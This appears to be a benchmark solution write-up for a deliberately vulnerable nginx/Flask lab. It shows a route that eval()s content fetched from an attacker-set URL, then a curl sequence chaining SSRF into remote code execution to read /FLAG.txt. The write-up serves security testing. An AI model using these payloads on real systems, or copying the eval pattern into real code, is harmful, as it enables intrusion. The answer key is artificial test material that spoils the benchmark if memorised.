# XBEN-082-24 — Unlogic nginx interaction

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vuln class:** Server-Side Request Forgery (SSRF) chained into unauthenticated
`eval()` of attacker-controlled content -> Remote Code Execution.

## Summary

Three services sit behind nginx: a static site, `flask_app` (the target), and `flask_api`.
nginx also runs a tiny njs helper (`nginx/conf.d/helper.js`) that exposes **unauthenticated**
endpoints to read/write two pieces of state persisted to disk inside the nginx container:

- `/name/set?name=...` and `/name` — an arbitrary "hostname" string, echoed back verbatim.
- `/api/set?url=...` and `/api/get` — an arbitrary "API URL" string, with **zero validation**
  of what that URL points to.

`app/app.py`'s `/app` route (proxied by nginx at `/app`) then does this, unauthenticated,
on every request:

```python
@app.route('/app')
def home():
    api = requests.get('http://nginx/api/get').text      # fetch the stored URL
    script = requests.get(api).text                       # fetch THAT url's content (SSRF)
    eval_result = eval(json.loads(script)["script"])       # eval() the "script" field!
    ...
```

So: (1) set nginx's stored `apiURL` to any URL we want via `/api/set`; (2) visit `/app`;
flask_app performs an outbound request to that URL (classic SSRF — the request is made
server-side), parses the response as JSON, and passes the `"script"` field straight into
Python's `eval()`. Since `eval()` evaluates an *expression* and flask_app's template renders
the return value (`{{ eval_result }}` in `app/templates/index.html`), making the server
evaluate `os.popen(...)` lands its `stdout` directly in the HTTP response.

**The payload host is the benchmark itself.** The JSON payload just needs to be served from a
URL the `flask_app` container can reach. nginx's own `/name` endpoint echoes back whatever
string was stored via `/name/set`, and `flask_app` already resolves `http://nginx/...` on the
internal network (its hardcoded `/api/get` fetch proves it). So storing the JSON payload as
the "name" and pointing the stored `apiURL` at `http://nginx/name` turns nginx into the
payload server — no external host, no extra container, no second port, nothing but HTTP
requests to the single published web port. (An earlier version of this guide staged a throwaway
payload container on the benchmark's docker network; that is unnecessary — and isn't something
a network-only attacker could do anyway — since `/name` is a perfectly good attacker-controlled
in-network payload source.)


## Exploit

```bash
PORT=<PORT>   # e.g. 56695

# 1. Store the JSON RCE payload as nginx's own "name" (echoed verbatim by /name).
curl -s -G "http://localhost:$PORT/name/set" \
  --data-urlencode 'name={"script": "__import__('"'"'os'"'"').popen('"'"'cat /FLAG.txt'"'"').read()"}'

# 2. Point the stored apiURL at nginx's own /name endpoint (in-network SSRF-to-self).
curl -s -G "http://localhost:$PORT/api/set" --data-urlencode "url=http://nginx/name"

# 3. Trigger flask_app's /app route: it fetches the apiURL (-> nginx/name -> our JSON),
#    json.loads() it, and eval()s the "script" field.
curl -s "http://localhost:$PORT/app"
```
